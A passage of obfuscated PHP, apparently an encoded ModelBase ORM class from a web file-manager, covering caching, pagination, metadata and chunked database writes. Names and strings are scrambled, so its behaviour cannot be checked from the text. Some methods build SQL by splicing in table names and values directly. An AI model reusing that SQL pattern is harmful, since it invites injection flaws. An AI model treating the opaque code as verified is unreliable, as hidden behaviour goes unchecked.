$âĞşŸ‰×; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\x79\124\151\155\x65", "\164\x69\155\x65", "\x69\x6e\163\145\162\164\x2c\165\160\144\141\164\x65", "\x66\x75\x6e\143\164\x69\157\x6e"), array("\x63\162\145\x61\x74\145\124\x69\155\145", "\164\x69\155\145", "\x69\156\163\145\x72\x74", "\146\165\156\143\164\151\x6f\x6e")); public function setDataAuto($ö…™áº„) { $this->dataAuto = $ö…™áº„; } public function __construct($Şî³²¤Á = '', $ŸØºŠı¼ = '', $± ŸÁ´ = '') { parent::__construct($Şî³²¤Á, $ŸØºŠı¼, $± ŸÁ´); } protected $tableMeta = array(); protected function _beforeInsert(&$ŒÒ†Ä¾©, $•Æê‹¼ä) { $ñ¹şÂôÀ =& $_SERVER[ä¿÷‹µ±]; if (!$this->checkDataAutoHas($ñ¹şÂôÀ[355])) { return; } $this->dataBeforeFilter($ŒÒ†Ä¾©, $ñ¹şÂôÀ[355]); } protected function _beforeUpdate(&$É¹Øô«Ï, $˜Æ±¸ñ¦) { $ÏæàîÌõ =& $_SERVER[ä¿÷‹µ±]; if (!$this->checkDataAutoHas($ÏæàîÌõ[356])) { return; } $this->dataBeforeFilter($É¹Øô«Ï, $ÏæàîÌõ[356]); } protected function _afterSelect(&$ùı™¬µŠ, $Ş…í¤â½) { if (!is_array($ùı™¬µŠ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ä¿÷‹µ±][357])) { return; } foreach ($ùı™¬µŠ as &$şÛ¡Ö…à) { $this->dataAfterFilter($şÛ¡Ö…à); } unset($şÛ¡Ö…à); } protected function _afterFind(&$Ğ€±×’°, $Š¾úı‘’) { if (!is_array($Ğ€±×’°)) { return; } if (!$this->checkDataAutoHas($_SERVER[ä¿÷‹µ±][357])) { return; } $this->dataAfterFilter($Ğ€±×’°); } public static function textEncode($‘àÒ––•) { if (!$‘àÒ––•) { return $‘àÒ––•; } $È×–‡Ù = json_encode($‘àÒ––•); $È×–‡Ù = preg_replace_callback($_SERVER[ä¿÷‹µ±][358], function ($Âéİ²å) { return addslashes($Âéİ²å[0]); }, $È×–‡Ù); return json_decode($È×–‡Ù); } public static function textDecode($ğÈ­½Ú) { $Á¼É±’† =& $_SERVER[ä¿÷‹µ±]; $‚Ôªúıš = json_encode($ğÈ­½Ú); $‚Ôªúıš = preg_replace_callback($Á¼É±’†[359], function ($äé€É·) { return $_SERVER[ä¿÷‹µ±][97]; }, $‚Ôªúıš); return json_decode($‚Ôªúıš); } public function setAutoIncrement($¸À•©¯ì) { $É¾Ğ¸Üõ = array($this->getPk() => $¸À•©¯ì); $«€¨äì = $this->data($É¾Ğ¸Üõ)->add(); if ($«€¨äì) { $this->delete($«€¨äì); } } public function getAutoIncrement() { $ÓÌŒÅá® = $this->getTableName(); $¤şŒÂ‹š = $this->max($this->getPk()); $ ÊâÌ¤ = $this->query("\x73\x68\x6f\167\40\x74\141\142\x6c\x65\x20\x73\x74\x61\x74\x75\x73\40\167\x68\x65\162\x65\40\x4e\x61\x6d\145\x3d\47{$ÓÌŒÅá®}\x27"); $›ƒÃ¹÷‰ = $ ÊâÌ¤[0][$_SERVER[ä¿÷‹µ±][360]]; $Û„€Ü¨÷ = max($¤şŒÂ‹š, $›ƒÃ¹÷‰); return $Û„€Ü¨÷; } protected function _callBefore($›ß“²­á, $ĞÍÒ¸æû) { return $this->cacheCallCheck($›ß“²­á, $ĞÍÒ¸æû, !1); } protected function _callAfter($»ØìùÎÊ, $Ü¤¯³†â) { return $this->cacheCallCheck($»ØìùÎÊ, $Ü¤¯³†â, !0); } protected function cacheFunctionAlias($›¢æ‘Âæ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($…§ò½Œó, $™ıõ³©, $Ô¨‹éº = false) { $Áµ‚Ä = $this->cacheFunctionAlias($™ıõ³©); if (!$Áµ‚Ä) { return; } foreach ($Áµ‚Ä as $şÈé“£µ => $³®à‚Ñ) { $ù£ãÓ– = $³®à‚Ñ[0]; $•äõë´  = explode($_SERVER[ä¿÷‹µ±][50], $³®à‚Ñ[1]); if ($…§ò½Œó == $şÈé“£µ) { return $this->cacheFunctionGet($şÈé“£µ, $ù£ãÓ–); } if ($Ô¨‹éº && in_array($…§ò½Œó, $•äõë´ )) { $this->cacheFunctionClear($şÈé“£µ, $ù£ãÓ–); } } } public function cacheFunctionGet($ı¤Íò±», $Ü“ÎÍ‘¯) { $£û€¦çÆ = $this->cacheKeyMake($ı¤Íò±», $Ü“ÎÍ‘¯); $ñ©ºªÂÇ = Cache::get($£û€¦çÆ); if (!is_array($ñ©ºªÂÇ)) { $ñ©ºªÂÇ = call_user_func_array(array($this, $ı¤Íò±»), array($Ü“ÎÍ‘¯, !0)); Cache::set($£û€¦çÆ, $ñ©ºªÂÇ); } return $ñ©ºªÂÇ; } public function cacheFunctionClear($Ö¬î¬Â¯, $õ‡Ñà¥Å) { $Š•Öå·é = $õ‡Ñà¥Å; if (!is_array($õ‡Ñà¥Å)) { $Š•Öå·é = array($õ‡Ñà¥Å); } foreach ($Š•Öå·é as $¸ÑÔ¸´ı) { $ÒµÍÇ»ú = $this->cacheKeyMake($Ö¬î¬Â¯, $¸ÑÔ¸´ı); Cache::remove($ÒµÍÇ»ú); } } private function cacheKeyMake($áşÇıÍö, $üŞ‘© ) { $¾ÕÄÈ­ı =& $_SERVER[ä¿÷‹µ±]; return get_class($this) . $¾ÕÄÈ­ı[11] . $áşÇıÍö . $¾ÕÄÈ­ı[361] . $üŞ‘© ; } protected function selectPageReset() { $ßÓÌÜ¾Å =& $_SERVER[ä¿÷‹µ±]; if (isset($GLOBALS[$ßÓÌÜ¾Å[362]])) { return; } $GLOBALS[$ßÓÌÜ¾Å[362]] = isset($GLOBALS[$ßÓÌÜ¾Å[7]][$ßÓÌÜ¾Å[363]]) ? $GLOBALS[$ßÓÌÜ¾Å[7]][$ßÓÌÜ¾Å[363]] : !1; $GLOBALS[$ßÓÌÜ¾Å[364]] = isset($GLOBALS[$ßÓÌÜ¾Å[7]][$ßÓÌÜ¾Å[353]]) ? $GLOBALS[$ßÓÌÜ¾Å[7]][$ßÓÌÜ¾Å[353]] : !1; $GLOBALS[$ßÓÌÜ¾Å[7]][$ßÓÌÜ¾Å[363]] = !1; $GLOBALS[$ßÓÌÜ¾Å[7]][$ßÓÌÜ¾Å[353]] = !1; } protected function selectPageRestore() { $—‰ó©ıÅ =& $_SERVER[ä¿÷‹µ±]; if (!isset($GLOBALS[$—‰ó©ıÅ[362]])) { return; } $GLOBALS[$—‰ó©ıÅ[7]][$—‰ó©ıÅ[363]] = $GLOBALS[$—‰ó©ıÅ[362]]; $GLOBALS[$—‰ó©ıÅ[7]][$—‰ó©ıÅ[353]] = $GLOBALS[$—‰ó©ıÅ[364]]; if ($GLOBALS[$—‰ó©ıÅ[7]][$—‰ó©ıÅ[363]] === !1) { unset($GLOBALS[$—‰ó©ıÅ[7]][$—‰ó©ıÅ[363]]); } if ($GLOBALS[$—‰ó©ıÅ[7]][$—‰ó©ıÅ[353]] === !1) { unset($GLOBALS[$—‰ó©ıÅ[7]][$—‰ó©ıÅ[353]]); } unset($GLOBALS[$—‰ó©ıÅ[362]]); unset($GLOBALS[$—‰ó©ıÅ[364]]); } protected function selectPage($ÅŸ‹Ï«’ = 200, $»ø´Ÿëı = 1) { $íéçÓÇ¡ =& $_SERVER[ä¿÷‹µ±]; global $in; $Ç¤ÂÓˆÛ = $this->optionsValue(); $ë¼ıÔ‡Ç = 50000; $ÅŸ‹Ï«’ = isset($in[$íéçÓÇ¡[363]]) && $in[$íéçÓÇ¡[363]] ? $in[$íéçÓÇ¡[363]] : $ÅŸ‹Ï«’; if ($ÅŸ‹Ï«’ === -1) { $in[$íéçÓÇ¡[363]] = !1; $ë¼ıÔ‡Ç = 100000000; $ÅŸ‹Ï«’ = $ë¼ıÔ‡Ç; } $ÏÁæİ÷ß = $Ç¤ÂÓˆÛ; $ÏÁæİ÷ß[$íéçÓÇ¡[365]] = array(); $ÅŸ‹Ï«’ = intval($ÅŸ‹Ï«’); $ÅŸ‹Ï«’ = $ÅŸ‹Ï«’ <= 5 ? 5 : ($ÅŸ‹Ï«’ >= $ë¼ıÔ‡Ç ? $ë¼ıÔ‡Ç : $ÅŸ‹Ï«’); $»ø´Ÿëı = intval(isset($in[$íéçÓÇ¡[353]]) && $in[$íéçÓÇ¡[353]] ? $in[$íéçÓÇ¡[353]] : $»ø´Ÿëı); $»ø´Ÿëı = $»ø´Ÿëı <= 1 ? 1 : $»ø´Ÿëı; $»ÂÜ±¬¨ = array(); $¹¬Æ‰Î÷ = 1; if ($»ø´Ÿëı == 1 && $¹¬Æ‰Î÷) { $this->optionsValue($Ç¤ÂÓˆÛ); $»ÂÜ±¬¨ = $this->page($»ø´Ÿëı, $ÅŸ‹Ï«’)->select(); $Ùâ¡Å­µ = is_array($»ÂÜ±¬¨) ? count($»ÂÜ±¬¨) : 0; if ($Ùâ¡Å­µ < $ÅŸ‹Ï«’) { $àËäû = 1; } else { $this->optionsValue($ÏÁæİ÷ß); $Ùâ¡Å­µ = intval($this->count()); $àËäû = ceil($Ùâ¡Å­µ / $ÅŸ‹Ï«’); } } else { $this->optionsValue($ÏÁæİ÷ß); $Ùâ¡Å­µ = intval($this->count()); $àËäû = ceil($Ùâ¡Å­µ / $ÅŸ‹Ï«’); $»ø´Ÿëı = $»ø´Ÿëı >= $àËäû ? $àËäû : $»ø´Ÿëı; $this->optionsValue($Ç¤ÂÓˆÛ); $»ÂÜ±¬¨ = $this->page($»ø´Ÿëı, $ÅŸ‹Ï«’)->select(); } if (!is_array($»ÂÜ±¬¨)) { $»ÂÜ±¬¨ = array(); } if ($àËäû == 1) { $Ùâ¡Å­µ = count($»ÂÜ±¬¨); } $ÎÈ§­ö = array($íéçÓÇ¡[366] => array($íéçÓÇ¡[367] => $Ùâ¡Å­µ, $íéçÓÇ¡[363] => $ÅŸ‹Ï«’, $íéçÓÇ¡[353] => $»ø´Ÿëı, $íéçÓÇ¡[368] => $àËäû), $íéçÓÇ¡[369] => $»ÂÜ±¬¨); return $ÎÈ§­ö; } protected function checkLength($¿Æ’‰¥ï, $ÂúÖ· = 0, $Ï©¢Ä¨ = '') { $¼ûİ í =& $_SERVER[ä¿÷‹µ±]; $ÂúÖ· = $ÂúÖ· ? $ÂúÖ· : 65536; if (!$¿Æ’‰¥ï || strlen($¿Æ’‰¥ï) < $ÂúÖ·) { return; } $Ï©¢Ä¨ = $Ï©¢Ä¨ ? $Ï©¢Ä¨ . $¼ûİ í[71] : $¼ûİ í[12]; show_json($Ï©¢Ä¨ . LNG($¼ûİ í[370]) . "\50{$ÂúÖ·}\51", !1); } protected function metaSet($ÔâÓÛ®, $ª×Ğ” = null, $°–•¡Ûı = null) { $À™µ¨†• =& $_SERVER[ä¿÷‹µ±]; if (!$this->tableMeta || !$ÔâÓÛ®) { return !1; } $ƒ÷î†Š = $this->tableMeta[$À™µ¨†•[371]]; $†şï™ğú = $this->tableMeta[$À™µ¨†•[372]]; $³ú—¥›É = Model($†şï™ğú); $ë¼†Âõø = array($ƒ÷î†Š => $ÔâÓÛ®, $À™µ¨†•[373] => $ª×Ğ”); if (is_null($ª×Ğ”)) { return $³ú—¥›É->where(array($ƒ÷î†Š => $ÔâÓÛ®))->delete(); } if (is_null($°–•¡Ûı) && is_string($ª×Ğ”)) { return $³ú—¥›É->where($ë¼†Âõø)->delete(); } $Şá“ÔêÉ = is_array($ª×Ğ”) ? $ª×Ğ” : array(); if (is_string($ª×Ğ”)) { $Şá“ÔêÉ[$ª×Ğ”] = $°–•¡Ûı; } $»¹ò› = array(); foreach ($Şá“ÔêÉ as $™ÕóõŒ‹ => $¢‡Î÷Æ ) { if (is_null($¢‡Î÷Æ ) && is_string($™ÕóõŒ‹)) { $³ú—¥›É->where(array($ƒ÷î†Š => $ÔâÓÛ®, $À™µ¨†•[373] => $™ÕóõŒ‹))->delete(); continue; } $this->checkLength($¢‡Î÷Æ , !1, $†şï™ğú . $À™µ¨†•[4] . $™ÕóõŒ‹); $»¹ò›[] = array($ƒ÷î†Š => $ÔâÓÛ®, $À™µ¨†•[94] => $™ÕóõŒ‹, $À™µ¨†•[374] => $¢‡Î÷Æ ); } $¨‚«ù®¡ = $À™µ¨†•[375] . $†şï™ğú; CacheLock::lock($¨‚«ù®¡); $³ú—¥›É->where(array($ƒ÷î†Š => $ÔâÓÛ®))->addAll($»¹ò›, array(), !0); CacheLock::unlock($¨‚«ù®¡); return !0; } public function metaGet($åÈ¦”¦Œ, $€­²¨š = false) { $Ä®†¯Öò =& $_SERVER[ä¿÷‹µ±]; if (!$this->tableMeta) { return array(); } $¡¨µì» = $this->tableMeta[$Ä®†¯Öò[371]]; $å®°“ª¬ = Model($this->tableMeta[$Ä®†¯Öò[372]]); if ($€­²¨š) { $¹æ°ìŒ¨ = array($¡¨µì» => $åÈ¦”¦Œ, $Ä®†¯Öò[94] => $€­²¨š); return $å®°“ª¬->where($¹æ°ìŒ¨)->getField($Ä®†¯Öò[374]); } $¹æ°ìŒ¨ = array($¡¨µì» => $åÈ¦”¦Œ); $ˆ˜ÉæÀ = $å®°“ª¬->field($Ä®†¯Öò[376])->where($¹æ°ìŒ¨)->select(); $ˆ˜ÉæÀ = array_to_keyvalue($ˆ˜ÉæÀ, $Ä®†¯Öò[94], $Ä®†¯Öò[374]); return $ˆ˜ÉæÀ; } private function checkDataAutoHas($Æ‹”ÑêÄ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $™©¯Â¡¬) { if (in_array($Æ‹”ÑêÄ, explode($_SERVER[ä¿÷‹µ±][50], $™©¯Â¡¬[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$‰×®äâ, $Ò«´¼µ‹) { $Éí–áÓ =& $_SERVER[ä¿÷‹µ±]; if (!is_array($‰×®äâ)) { return; } foreach ($this->dataAuto as $´ç¨ŞÈ) { $Ò”’Şß = $´ç¨ŞÈ[0]; if (!in_array($Ò«´¼µ‹, explode($Éí–áÓ[50], $´ç¨ŞÈ[2]))) { continue; } switch (trim($´ç¨ŞÈ[3])) { case $Éí–áÓ[321]: case $Éí–áÓ[322]: $ö·ˆ˜¨Ú = $´ç¨ŞÈ[1]; $ıïİ°ˆ = isset($´ç¨ŞÈ[4]) ? (array) $´ç¨ŞÈ[4] : array(); if ($ö·ˆ˜¨Ú == $Éí–áÓ[203] && array_key_exists($Ò”’Şß, $‰×®äâ)) { if (!$‰×®äâ[$Ò”’Şß]) { unset($‰×®äâ[$Ò”’Şß]); } break; } if (isset($‰×®äâ[$Ò”’Şß])) { array_unshift($ıïİ°ˆ, $‰×®äâ[$Ò”’Şß]); } if ($Éí–áÓ[321] == $´ç¨ŞÈ[3]) { $‰×®äâ[$Ò”’Şß] = call_user_func_array($ö·ˆ˜¨Ú, $ıïİ°ˆ); } else { $‰×®äâ[$Ò”’Şß] = call_user_func_array(array(&$this, $ö·ˆ˜¨Ú), $ıïİ°ˆ); } break; case $Éí–áÓ[270]: if (isset($‰×®äâ[$Ò”’Şß]) && $‰×®äâ[$Ò”’Şß]) { $‰×®äâ[$Ò”’Şß] = call_user_func_array(array(&$this, $´ç¨ŞÈ[1]), array($‰×®äâ[$Ò”’Şß])); } break; case $Éí–áÓ[273]: $‰×®äâ[$Ò”’Şß] = $‰×®äâ[$´ç¨ŞÈ[1]]; break; case $Éí–áÓ[294]: if (isset($‰×®äâ[$Ò”’Şß]) && !is_string($‰×®äâ[$Ò”’Şß])) { $‰×®äâ[$Ò”’Şß] = json_encode_force($‰×®äâ[$Ò”’Şß]); } break; case $Éí–áÓ[323]: if ($‰×®äâ[$Ò”’Şß] === $Éí–áÓ[12]) { unset($‰×®äâ[$Ò”’Şß]); } break; case $Éí–áÓ[324]: $‰×®äâ[$Ò”’Şß] = $´ç¨ŞÈ[1]; default: break; } } if ($Ò«´¼µ‹ == $Éí–áÓ[355]) { $öÉ½İö = strtolower($this->db->getDbType()); if (strpos($öÉ½İö, $Éí–áÓ[13]) !== 0) { return; } $Ÿä±‚Æ = $this->field(!0)->fields; $î»Åİïû = $Ÿä±‚Æ[$Éí–áÓ[252]]; if (isset($Ÿä±‚Æ[$Éí–áÓ[251]])) { unset($î»Åİïû[$Ÿä±‚Æ[$Éí–áÓ[251]]]); } foreach ($î»Åİïû as $Ğ™äŞÁÓ => $Ò«´¼µ‹) { if (!isset($‰×®äâ[$Ğ™äŞÁÓ])) { $‰×®äâ[$Ğ™äŞÁÓ] = $Éí–áÓ[12]; } } } } private function dataAfterFilter(&$å­°¼»×) { $®æíÉÑó =& $_SERVER[ä¿÷‹µ±]; foreach ($this->dataAuto as $œÎØ†½¿) { $Ğ¸ñ²Í¿ = $œÎØ†½¿[0]; if (!isset($å­°¼»×[$Ğ¸ñ²Í¿])) { continue; } if (!in_array($®æíÉÑó[357], explode($®æíÉÑó[50], $œÎØ†½¿[2]))) { continue; } switch (trim($œÎØ†½¿[3])) { case $®æíÉÑó[321]: case $®æíÉÑó[322]: $¸¢éíŞ· = isset($œÎØ†½¿[4]) ? (array) $œÎØ†½¿[4] : array(); array_unshift($¸¢éíŞ·, $å­°¼»×[$Ğ¸ñ²Í¿]); if (isset($œÎØ†½¿[4]) && $œÎØ†½¿[4] == $®æíÉÑó[377]) { $¸¢éíŞ· = array($å­°¼»×[$Ğ¸ñ²Í¿]); } if ($®æíÉÑó[321] == $œÎØ†½¿[3]) { $å­°¼»×[$Ğ¸ñ²Í¿] = call_user_func_array($œÎØ†½¿[1], $¸¢éíŞ·); } else { $å­°¼»×[$Ğ¸ñ²Í¿] = call_user_func_array(array(&$this, $œÎØ†½¿[1]), $¸¢éíŞ·); } break; case $®æíÉÑó[270]: if (isset($å­°¼»×[$Ğ¸ñ²Í¿]) && $å­°¼»×[$Ğ¸ñ²Í¿]) { $å­°¼»×[$Ğ¸ñ²Í¿] = call_user_func_array(array(&$this, $œÎØ†½¿[1]), array($å­°¼»×[$Ğ¸ñ²Í¿])); } break; case $®æíÉÑó[273]: $å­°¼»×[$Ğ¸ñ²Í¿] = $å­°¼»×[$œÎØ†½¿[1]]; break; case $®æíÉÑó[294]: $Ş„İğ‘¨ = $å­°¼»×[$Ğ¸ñ²Í¿]; $å­°¼»×[$Ğ¸ñ²Í¿] = json_decode($Ş„İğ‘¨, !0); if (is_null($å­°¼»×[$Ğ¸ñ²Í¿])) { $å­°¼»×[$Ğ¸ñ²Í¿] = $Ş„İğ‘¨; } break; case $®æíÉÑó[323]: if ($å­°¼»×[$Ğ¸ñ²Í¿] === $®æíÉÑó[12]) { unset($å­°¼»×[$Ğ¸ñ²Í¿]); } break; case $®æíÉÑó[324]: $å­°¼»×[$Ğ¸ñ²Í¿] = $œÎØ†½¿[1]; break; default: break; } } } public function saveAll($öæç‰©•) { $¶ß¦ˆ– =& $_SERVER[ä¿÷‹µ±]; $ôà²ŠÁè = $this->tablePrefix . $this->tableName; $·‹œÅÑË = self::SQL_WHERE_IN_CHUNK; $öæç‰©• = is_array($öæç‰©•) ? $öæç‰©• : array(); $áÃÂ°ô = $¶ß¦ˆ–[378]; $‡‚ºë˜® = 0; $¦á¼ÏÄ = array(); $¤€Çı‰œ = count($öæç‰©•); for ($ø¶İˆ™Ø = 0; $ø¶İˆ™Ø < $¤€Çı‰œ; $ø¶İˆ™Ø++) { $¥©÷ì”µ = $öæç‰©•[$ø¶İˆ™Ø]; if (!is_array($¥©÷ì”µ) || count($¥©÷ì”µ) != 4) { continue; } $Û©¦ÁÄş = "\125\x50\104\x41\124\x45\40\140{$ôà²ŠÁè}\x60\40\x53\105\x54\40{$¥©÷ì”µ[2]}\x20\x3d\40\x43\x41\x53\x45\40{$¥©÷ì”µ[0]}\40\12"; if ($‡‚ºë˜® == 0) { $áÃÂ°ô = $Û©¦ÁÄş; } $¦á¼ÏÄ[] = $¶ß¦ˆ–[118] . $¥©÷ì”µ[1] . $¶ß¦ˆ–[118]; $‡‚ºë˜®++; $áÃÂ°ô .= "\x20\127\x48\x45\x4e\x20\47{$¥©÷ì”µ[1]}\x27\x20\x54\110\x45\x4e\x20\47{$¥©÷ì”µ[3]}\x27\x20\xa"; if ($‡‚ºë˜® == $·‹œÅÑË || $ø¶İˆ™Ø == $¤€Çı‰œ - 1) { $Íù±øóò = implode($¶ß¦ˆ–[50], $¦á¼ÏÄ); $áÃÂ°ô .= "\x20\105\x4e\x44\40\40\x57\110\105\122\105\x20{$¥©÷ì”µ[0]}\40\x49\116\40\x28{$Íù±øóò}\x29\40"; $this->execute($áÃÂ°ô); $‡‚ºë˜® = 0; $áÃÂ°ô = $Û©¦ÁÄş; $this->chunkEventCheck(count($¦á¼ÏÄ)); $¦á¼ÏÄ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ƒï ŸÉş) { $óÂ®æÙ =& $_SERVER[ä¿÷‹µ±]; $Ûù×¯ = $this->tablePrefix . $this->tableName; foreach ($ƒï ŸÉş as $ Òâ) { if (!is_array($ Òâ) || count($ Òâ) != 4) { continue; } $³ñœæ£ = $ Òâ[0] . $óÂ®æÙ[379] . $ Òâ[1] . $óÂ®æÙ[118]; $ÒòÖÍû = $ Òâ[2] . $óÂ®æÙ[379] . $ Òâ[3] . $óÂ®æÙ[118]; $Ê÷‹ÎÅˆ = "\x75\x70\x64\141\x74\145\40{$Ûù×¯}\x20\x73\145\x74\40{$ÒòÖÍû}\x20\167\150\x65\x72\145\x20{$³ñœæ£}\x3b"; $this->execute($Ê÷‹ÎÅˆ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($‹¥áü‡é = false, $Õƒ’¬¹ú = false) { $this->_chunkEvent = $‹¥áü‡é; $this->_chunkEventParam = $Õƒ’¬¹ú; } private function chunkEventCheck($şÂ¢•·) { if (!$this->_chunkEvent) { return; } $ÌÄ¶çú¯ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ÌÄ¶çú¯[$_SERVER[ä¿÷‹µ±][380]] = $şÂ¢•·; Hook::trigger($this->_chunkEvent, $ÌÄ¶çú¯); } public function addAll($Õ”“º¾Û, $Èå´´¨£ = array(), $ ‚ˆêÁë = false) { $¿¹Ëœô» =& $_SERVER[ä¿÷‹µ±]; ignore_timeout(); $÷öÁ«ŠÀ = self::SQL_WHERE_IN_CHUNK; if (empty($Õ”“º¾Û)) { $this->error = think_lang($¿¹Ëœô»[271]); return !1; } $Èå´´¨£ = $this->_parseOptions($Èå´´¨£); foreach ($Õ”“º¾Û as $Ñ“·ÍÎ¡ => $²íï²º) { $Õ”“º¾Û[$Ñ“·ÍÎ¡] = $this->_facade($²íï²º); $this->_beforeInsert($Õ”“º¾Û[$Ñ“·ÍÎ¡], $Èå´´¨£); } if (method_exists($this->db, $¿¹Ëœô»[272])) { for ($á††ò²“ = 0; $á††ò²“ < count($Õ”“º¾Û); $á††ò²“ += $÷öÁ«ŠÀ) { $‘ÅÇè± = array_slice($Õ”“º¾Û, $á††ò²“, $÷öÁ«ŠÀ); if (!is_array($‘ÅÇè±) || count($‘ÅÇè±) == 0) { break; } $¶÷ï¸ = $this->db->insertAll($‘ÅÇè±, $Èå´´¨£, $ ‚ˆêÁë); $this->chunkEventCheck(count($‘ÅÇè±)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Õ”“º¾Û as $Ñ“·ÍÎ¡ => $²íï²º) { $¶÷ï¸ = $this->db->insert($²íï²º, $Èå´´¨£, $ ‚ˆêÁë); } $this->commit(); } if (!1 !== $¶÷ï¸) { $‚•¯ª‰ = $this->getLastInsID(); if ($‚•¯ª‰) { return $‚•¯ª‰; } } return $¶÷ï¸; } public function save($èã¢‰¾œ = '', $»‰ŒˆõÊ = array()) { $ó¨Ö£”² =& $_SERVER[ä¿÷‹µ±]; $˜­’±éì = self::SQL_WHERE_IN_CHUNK; $…ı…ˆ…¨ = $this->optionsValue(); $ÚÌ±ÍâÖ = $this->findWhereField($…ı…ˆ…¨); if (!$ÚÌ±ÍâÖ) { return parent::save($èã¢‰¾œ, $»‰ŒˆõÊ); } $µ£Ú’Ûù = 0; $¨©ş™Ø¼ = $…ı…ˆ…¨[$ó¨Ö£”²[275]][$ÚÌ±ÍâÖ][1]; $¨©ş™Ø¼ = is_array($¨©ş™Ø¼) ? $¨©ş™Ø¼ : array(); $å¿“Ê«î = count($¨©ş™Ø¼); for ($š¤¹½Ó„ = 0; $š¤¹½Ó„ < $å¿“Ê«î; $š¤¹½Ó„ += $˜­’±éì) { $¯Óæç = array_slice($¨©ş™Ø¼, $š¤¹½Ó„, $˜­’±éì); if (!is_array($¯Óæç) || count($¯Óæç) == 0) { break; } $…ı…ˆ…¨[$ó¨Ö£”²[275]][$ÚÌ±ÍâÖ][1] = $¯Óæç; $this->optionsValue($…ı…ˆ…¨); $µ£Ú’Ûù += parent::save($èã¢‰¾œ, $»‰ŒˆõÊ); $this->chunkEventCheck(count($¯Óæç)); } $this->chunkEventSet(); return $µ£Ú’Ûù; } public function add($£Ú‡”ì = '', $î¶¥ìş€ = array(), $‡±ÇòÇÄ = false) { if ($this->addTaskStatus && is_array($£Ú‡”ì)) { $this->addTaskData[] = $£Ú‡”ì; return; } return parent::add($£Ú‡”ì, $î¶¥ìş€, $‡±ÇòÇÄ); } public function parseWhereLike($ïœœ•¶, $ã•‡ñˆ– = '', $éŸÜĞ = false, &$½´¯²âÍ = false) { $ê»ò„ª“ =& $_SERVER[ä¿÷‹µ±]; $å‚‚Â› = $GLOBALS[$ê»ò„ª“[6]][$ê»ò„ª“[381]]; if (!$å‚‚Â›[$ê»ò„ª“[382]]) { return $ïœœ•¶; } if (!is_array($ïœœ•¶)) { return $ïœœ•¶; } $Ú¶‚ÛÂ» = array(); $è»›¡÷ˆ = 0; foreach ($ïœœ•¶ as $ˆŒÏ®Üô => $¡–ÃË‘) { if (is_array($¡–ÃË‘) && count($¡–ÃË‘) == 2 && $¡–ÃË‘[0] == $ê»ò„ª“[383] && is_string($¡–ÃË‘[1]) && substr($¡–ÃË‘[1], 0, 1) == $ê»ò„ª“[384] && substr($¡–ÃË‘[1], strlen($¡–ÃË‘[1]) - 1, 1) == $ê»ò„ª“[384]) { $½´¯²âÍ = !0; $Ó±’ÏÊ‹ = is_string($ˆŒÏ®Üô) ? $ˆŒÏ®Üô : $ã•‡ñˆ–; $àßöÙğç = substr($¡–ÃË‘[1], 1, strlen($¡–ÃË‘[1]) - 2); $àßöÙğç = $this->db->escapeString($àßöÙğç); if (!strpos($Ó±’ÏÊ‹, $ê»ò„ª“[10])) { $Ó±’ÏÊ‹ = $ê»ò„ª“[385] . $Ó±’ÏÊ‹ . $ê»ò„ª“[385]; } $ö«‘ïŸœ = $ê»ò„ª“[188] . $àßöÙğç . $ê»ò„ª“[188]; $àßöÙğç = str_replace(array($ê»ò„ª“[10], $ê»ò„ª“[386], $ê»ò„ª“[11]), $ê»ò„ª“[387], $àßöÙğç); if ($å‚‚Â›[$ê»ò„ª“[388]]) { $ö«‘ïŸœ = $ê»ò„ª“[389] . $àßöÙğç . $ê»ò„ª“[390]; if ($å‚‚Â›[$ê»ò„ª“[391]]) { $ö«‘ïŸœ = $ê»ò„ª“[390] . $àßöÙğç . $ê»ò„ª“[389]; } } $Ú¶‚ÛÂ»[$è»›¡÷ˆ] = $ê»ò„ª“[392] . $Ó±’ÏÊ‹ . $ê»ò„ª“[393] . $ö«‘ïŸœ . $ê»ò„ª“[394]; $è»›¡÷ˆ++; continue; } if (is_array($¡–ÃË‘)) { $ã•‡ñˆ– = is_string($ˆŒÏ®Üô) ? $ˆŒÏ®Üô : $ã•‡ñˆ–; $¡–ÃË‘ = $this->parseWhereLike($¡–ÃË‘, $ã•‡ñˆ–, !0, $½´¯²âÍ); } if (is_numeric($ˆŒÏ®Üô)) { $Ú¶‚ÛÂ»[$è»›¡÷ˆ] = $¡–ÃË‘; $è»›¡÷ˆ++; } else { $Ú¶‚ÛÂ»[$ˆŒÏ®Üô] = $¡–ÃË‘; } } if ($½´¯²âÍ && !$éŸÜĞ) { } return $Ú¶‚ÛÂ»; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ì¸ïŒŞï = array()) { $Ï‘ÀÑ§– =& $_SERVER[ä¿÷‹µ±]; $ïÒ†Ş˜¼ = self::SQL_WHERE_IN_CHUNK; $íêÊ™¬ = $this->optionsValue(); $Û²ÉÈË¹ = $this->findWhereField($íêÊ™¬); if (!$Û²ÉÈË¹ || isset($íêÊ™¬[$Ï‘ÀÑ§–[292]]) || isset($íêÊ™¬[$Ï‘ÀÑ§–[353]])) { return parent::select($ì¸ïŒŞï); } $™¢»³·„ = $íêÊ™¬[$Ï‘ÀÑ§–[275]][$Û²ÉÈË¹][1]; $™¢»³·„ = is_array($™¢»³·„) ? $™¢»³·„ : array(); $´ô¯º–é = null; for ($Ã×£ÊÑë = 0; $Ã×£ÊÑë < count($™¢»³·„); $Ã×£ÊÑë += $ïÒ†Ş˜¼) { $¢…Ù±ò = array_slice($™¢»³·„, $Ã×£ÊÑë, $ïÒ†Ş˜¼); if (!is_array($¢…Ù±ò) || count($¢…Ù±ò) == 0) { break; } $íêÊ™¬[$Ï‘ÀÑ§–[275]][$Û²ÉÈË¹][1] = $¢…Ù±ò; $this->optionsValue($íêÊ™¬); $ÁÎ³û“ö = parent::select($ì¸ïŒŞï); if 